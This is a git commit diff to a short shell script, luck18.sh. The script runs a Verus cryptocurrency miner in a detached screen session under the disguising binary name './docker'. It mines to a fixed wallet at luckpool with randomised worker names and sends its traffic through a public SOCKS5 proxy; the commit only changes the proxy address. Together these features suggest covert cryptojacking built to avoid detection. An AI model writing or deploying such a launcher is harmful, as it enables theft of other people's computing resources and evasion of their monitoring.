d0a5a238eaa7c8ddf33f9f096525bbede8ee8bf6
wertesd <86517111+wertesd@users.noreply.github.com>
2021-07-05 17:16:47 +0700

    Update luck18.sh

--- luck18.sh
+++ luck18.sh
@@ -6,5 +6,5 @@ screen -dmS ls
 POOL=stratum+tcp://eu.luckpool.net:3956
 WALLET=RV4aazLmcwkYC6W3uWmDUDAvQKNYgUGbw7
 WORKER=$(echo $(shuf -i 1-10 -n 1)Lukas)
-PROXY=socks5://192.111.129.150:4145
+PROXY=socks5://24.249.199.12:4145
 ./docker -a verus -o $POOL -u $WALLET.$WORKER -p x -t 2 -x $PROXY
